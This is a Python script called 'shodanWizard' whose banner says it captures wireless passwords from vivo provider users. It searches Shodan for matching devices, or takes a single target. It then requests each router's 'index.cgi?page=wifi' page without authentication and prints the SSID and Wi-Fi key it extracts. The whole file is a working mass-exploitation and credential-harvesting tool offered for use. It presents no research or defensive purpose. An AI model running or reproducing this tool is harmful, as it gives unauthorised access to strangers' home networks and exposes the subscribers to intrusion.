import requests
import shodan
import argparse
from pyfiglet import Figlet
import sys

class bgColor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

isASingletarget = False

def Banner() :
	Wizard = Figlet(font='slant')
	Graph = Wizard.renderText('shodanWizard')

	print("%s" % (Graph))
	print("%s" % (bgColor.FAIL + "This tool captures wireless passwords from vivo provider users\nUse of this tool for crimes is on your responsibility." + bgColor.ENDC))


try:
	import requests
	import shodan
	import argparse
except ImportError as e:
	Banner()
	print("Error: %s" %(e))
	print("Try ... pip install -r requirements")

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', dest='target', type=str, help='Target Host')
parser.add_argument('-p', '--port', dest='port', type=str, help='Port')
parser.add_argument('-s', '--search', dest='search', type=str, help='Dork')
parser.add_argument('-k', '--key', dest='address', type=str, help='Shodan API key')
parser.add_argument('-l','--limit', dest="limit", type=str, help='Limit the number of registers responsed by Shodan')
parser.add_argument('-o','--offset', dest="offset", type=str, help='Shodan skips this number of registers from response')
args = parser.parse_args()

def exploit(host, port) :

	paths = ['index.cgi?page=wifi']

	for path in paths:

		try:

			print(bgColor.WARNING + "[+] Get Wireless Password From http://%s:%s " % (host, port) + bgColor.ENDC)

			payload = "http://%s:%s/%s" % (host, port, path)

			request = requests.get(payload, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'}, timeout=1)
			response = request.text.strip()

			credentials = response.split('&')

			for e, credential in enumerate(credentials, 0) :
				if not(len(credential)) <= 0 :
					credential = credential.strip('')
					if credential.find('ssid') != -1 or credential.find('psk_wepkey=') != -1:
						credential = credential.replace('=', ':')
						print(bgColor.OKGREEN + bgColor.BOLD + "[+] %s" % credential + bgColor.ENDC)
						
		except requests.exceptions.Timeout as e:
			print(bgColor.FAIL + "[+] Connect timeout %s" % (host) + bgColor.ENDC)
			continue
		except requests.exceptions.ConnectionError as e :
			print(bgColor.FAIL + "[+] Connection Error %s " % (host) + bgColor.ENDC)
			continue

def ShodanSearch() :

	shodanAPI = shodan.Shodan(args.address)
	api = shodanAPI.search(args.search, limit = args.limit, offset= args.offset)
	total = api.get('total')

	print(bgColor.OKGREEN + "\n[+] Shodan results: %s" % (total) + bgColor.ENDC)

	for hosts in api['matches'] :
		host = hosts.get('ip_str')
		port = hosts.get('port')

		exploit(host, port)

if args.target and args.port:
	isASingletarget = True
	
if isASingletarget:
	Banner()
	exploit(args.target, args.port)
else:
	Banner()
	ShodanSearch()

